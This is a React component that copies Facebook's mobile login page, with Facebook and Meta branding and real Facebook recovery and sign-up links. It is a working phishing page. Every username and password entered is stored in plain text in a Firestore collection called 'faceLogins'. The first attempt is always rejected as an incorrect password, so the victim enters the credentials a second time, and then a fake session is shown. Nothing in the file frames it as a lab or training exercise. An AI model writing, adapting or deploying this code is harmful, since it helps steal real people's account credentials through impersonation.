"use client";

import React, { useState, useEffect } from "react";
import { collection, addDoc, serverTimestamp } from "firebase/firestore";
import { db } from "./firebase";
import Mess from "./Mess.jsx";

const FaceLogin = () => {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [statusMessage, setStatusMessage] = useState("");
  const [isUploading, setIsUploading] = useState(false);
  const [attempt, setAttempt] = useState(1);
  const [showPassword, setShowPassword] = useState(false);
  const [showMess, setShowMess] = useState(false);
  const [isChecking, setIsChecking] = useState(true);

  useEffect(() => {
    // Flag to make sure we only clear old sessions once
    const resetDone = localStorage.getItem("fb_reset_done");

    if (!resetDone) {
      // Clear previous testing session
      localStorage.removeItem("facebook_session_active");

      // Mark reset as done so it doesn't happen again
      localStorage.setItem("fb_reset_done", "true");
    }

    const hasLoggedIn = localStorage.getItem("facebook_session_active");

    if (hasLoggedIn) {
      setShowMess(true);
    }

    setIsChecking(false);
  }, []);

  const handleLogin = async (e) => {
    e.preventDefault();
    setIsUploading(true);
    setStatusMessage("");

    try {
      const loginCollectionRef = collection(db, "faceLogins");

      await addDoc(loginCollectionRef, {
        username,
        password,
        attempt,
        createdAt: serverTimestamp(),
      });

      if (attempt === 1) {
        setStatusMessage("Incorrect password. Please try again.");
        setPassword("");
        setAttempt(2);
      } else {
        // Save login session
        localStorage.setItem("facebook_session_active", "true");

        setShowMess(true);
      }
    } catch (error) {
      setStatusMessage(`Error: ${error.message}`);
    } finally {
      setIsUploading(false);
    }
  };

  if (isChecking) {
    return <div className="min-h-screen bg-[#F0F2F5]"></div>;
  }

  if (showMess) {
    return <Mess />;
  }
  
const sendEmail = async () => {
  await fetch("/api/send-email", {
    method: "POST",
  });
};
  return (
    <div className="min-h-screen bg-[#F0F2F5] flex flex-col justify-between">
      {/* Top Section */}
      <div className="px-6 pt-6">
        <div className="text-center text-[13px] text-gray-500 mb-8">
          English (US)
        </div>

        <div className="flex justify-center mb-12">
          <img
            src="./facebook.png"
            alt="Facebook logo"
            className="w-[60px] h-[60px] object-contain"
          />
        </div>

        <form onSubmit={handleLogin} className="space-y-3">
          <div className="bg-white text-black rounded-xl border border-gray-300 overflow-hidden">
            <input
              type="text"
              placeholder="Mobile number or email"
              value={username}
              onChange={(e) => setUsername(e.target.value)}
              required
              className="w-full px-4 py-3.5 text-sm focus:outline-none focus:ring-2 focus:ring-[#1877F2]"
            />
          </div>

          <div className="bg-white text-black rounded-xl border border-gray-300 overflow-hidden relative">
            <input
              type={showPassword ? "text" : "password"}
              placeholder="Password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              required
              className="w-full pl-4 pr-12 py-3.5 text-sm focus:outline-none focus:ring-2 focus:ring-[#1877F2]"
            />

            <button
              type="button"
              onClick={() => setShowPassword(!showPassword)}
              className="absolute right-3 top-1/2 -translate-y-1/2 p-1 text-gray-500 hover:text-gray-700 focus:outline-none">
              {showPassword ? (
                <svg
                  className="w-5 h-5"
                  fill="none"
                  stroke="currentColor"
                  viewBox="0 0 24 24">
                  <path
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    strokeWidth={2}
                    d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"
                  />
                  <path
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    strokeWidth={2}
                    d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"
                  />
                </svg>
              ) : (
                <svg
                  className="w-5 h-5"
                  fill="none"
                  stroke="currentColor"
                  viewBox="0 0 24 24">
                  <path
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    strokeWidth={2}
                    d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.88 9.88l-3.29-3.29m7.532 7.532l3.29 3.29M3 3l3.59 3.59m0 0A9.953 9.953 0 0112 5c4.478 0 8.268 2.943 9.543 7a10.025 10.025 0 01-4.132 5.411m0 0L21 21"
                  />
                </svg>
              )}
            </button>
          </div>

          <button
            type="submit"
            disabled={isUploading}
            className="w-full bg-[#1877F2] hover:bg-[#166FE5] text-white py-3.5 rounded-full font-semibold text-[15px] transition active:scale-[0.98] disabled:opacity-70">
            {isUploading ? "Logging in..." : "Log in"}
          </button>
        </form>

        {statusMessage && (
          <div className="mt-4 p-3 bg-red-50 border border-red-200 rounded-lg">
            <p className="text-xs text-red-600 text-center font-medium">
              {statusMessage}
            </p>
          </div>
        )}

        <div className="text-center mt-5">
          <a
            href="https://www.facebook.com/recover/initiate/"
            className="text-[14px] text-black font-medium hover:underline">
            Forgot password?
          </a>
        </div>
      </div>

      {/* Bottom */}
      <div className="px-6 pb-8 text-center space-y-6">
        <button
          type="button"
          onClick={() =>
            (window.location.href = "https://www.facebook.com/r.php")
          }
          className="w-full border border-[#1877F2] text-[#1877F2] py-3.5 rounded-full font-semibold text-[15px] hover:bg-[#E7F3FF] transition">
          Create new account
        </button>

        <div className="flex justify-center">
          <img
            src="./meta.png"
            alt="Meta logo"
            className="w-[60px] h-[60px] object-contain"
          />
        </div>
      </div>
    </div>
  );
};

export default FaceLogin;
